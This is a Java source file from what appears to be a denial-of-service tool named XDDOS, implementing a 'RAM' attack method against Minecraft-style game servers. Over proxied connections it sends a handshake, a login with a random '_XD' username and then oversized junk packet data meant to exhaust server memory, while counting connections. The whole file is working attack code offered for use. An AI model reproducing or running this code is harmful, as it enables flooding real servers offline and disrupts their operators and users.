package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import XD.XDDOS.utils.PacketUtils;
import XD.XDDOS.utils.RandomUtils;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.util.Random;
import java.util.zip.Deflater;

public class RAM
  implements Method {
  private Handshake handshake;
  private byte[] bytes;

  private String randomString(int len) {
    int leftLimit = 97;
    int rightLimit = 122;
    int targetStringLength = len;
    Random random = new Random();
    StringBuilder buffer = new StringBuilder(targetStringLength);
    for (int i = 0; i < targetStringLength; i++) {
      int randomLimitedInt = leftLimit + (int)(random.nextFloat() * (rightLimit - leftLimit + 1));
      buffer.append((char)randomLimitedInt);
    }
    return buffer.toString();
  }

  public RAM() {
    this.handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
    this.bytes = this.handshake.getWrappedPacket();
  }

  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    try {
      channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(RandomUtils.randomUTF16String1(13)+"_XD")).getWrappedPacket()));
      bbbb.write(new byte[15000]);
      for (int var9 = 0; var9 < 260; var9++) {
        bbbb.write(3);
        bbbb.write(0);
        bbbb.write(1);
        bbbb.write(49);
      }
    } catch (IOException ioException) {
      ioException.printStackTrace();
    }
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }

  public byte[] compress(byte[] packet, int threshold) throws IOException {
    ByteArrayOutputStream bytes = new ByteArrayOutputStream();
    DataOutputStream out = new DataOutputStream(bytes);
    byte[] buffer = new byte[8192];
    if (packet.length >= threshold && threshold > 0) {
      byte[] data = new byte[packet.length];
      System.arraycopy(packet, 0, data, 0, packet.length);
      PacketUtils.writeVarInt(out, data.length);
      Deflater def = new Deflater();
      def.setInput(data, 0, data.length);
      def.finish();
      while (!def.finished()) {
        int i = def.deflate(buffer);
        out.write(buffer, 0, i);
      }
      def.reset();
    } else {
      PacketUtils.writeVarInt(out, 0);
      out.write(packet);
    }
    out.close();
    return bytes.toByteArray();
  }

  public static void writePacket(byte[] packetData, ByteBufOutputStream out) throws IOException {
    writeVarInt(packetData.length, out);
    out.write(packetData);
  }

  public static void writeVarInt(int value, ByteBufOutputStream out) throws IOException {
    while ((value & 0xFFFFFF80) != 0) {
      out.writeByte(value & 0x7F | 0x80);
      value >>>= 7;
    }
    out.writeByte(value);
  }
}
